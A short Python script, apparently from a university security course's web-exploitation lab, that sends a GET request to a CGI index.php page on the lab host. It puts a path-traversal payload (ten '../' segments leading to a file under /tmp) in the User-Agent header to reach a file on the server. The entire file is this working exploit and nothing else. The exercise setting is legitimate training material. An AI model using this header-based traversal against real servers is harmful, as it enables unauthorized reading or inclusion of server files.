import requests as r

base = 'http://webexploit.cn.cse545.io:8086'
site = base + '/cgi-bin/index.php'
user_agent = '../' * 10 + 'tmp/shenlelu'

headers = {'User-Agent': user_agent}

out = r.get(site, headers=headers)
print(out.text)
